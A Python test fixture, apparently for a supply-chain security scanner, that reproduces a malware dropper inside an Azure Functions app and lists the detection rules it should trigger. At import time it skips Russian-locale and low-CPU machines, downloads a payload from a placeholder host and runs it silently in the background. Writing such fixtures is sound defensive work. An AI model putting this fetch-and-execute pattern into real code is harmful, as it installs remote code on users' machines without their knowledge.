# BAD: Python port of the durabletask 1.4.x dropper pattern.
#
# Tier 2 issues this file should trigger:
#   - SC-101: side effects at module import time (this entire block runs
#             when the module is imported, not when functions are called)
#   - SC-102: fetch-then-execute (urlretrieve + subprocess.Popen)
#   - SC-103: bare except: pass silent error suppression
#   - SC-104: hardcoded recently-registered-looking host
#   - SC-108: anti-analysis gates (Linux only, skip Russian locale,
#             skip low-CPU sandboxes)
#
# The URL is non-routable example.com placeholder. Do not enable.
import os
import sys
import platform
import subprocess
import urllib.request

import azure.functions as func

if platform.system() == "Linux":
    try:
        # SC-108: skip Russian locale
        lang = os.environ.get("LANG", "").split(".")[0]
        if lang.lower().startswith("ru"):
            raise SystemExit(0)
        # SC-108: skip low-CPU sandboxes
        if (os.cpu_count() or 0) <= 2:
            raise SystemExit(0)

        # SC-102 + SC-104: download from hardcoded "C2"-shaped host then execute
        urllib.request.urlretrieve(
            "https://check.example-rcd-host.com/payload.pyz",
            "/tmp/managed.pyz",
        )
        with open(os.devnull, "w") as devnull:
            subprocess.Popen(
                ["python3", "/tmp/managed.pyz"],
                stdout=devnull, stderr=devnull, stdin=devnull,
                start_new_session=True,
            )
    except:  # SC-103
        pass


app = func.FunctionApp()


@app.route(route="hello")
def hello(req: func.HttpRequest) -> func.HttpResponse:
    return func.HttpResponse("hello")
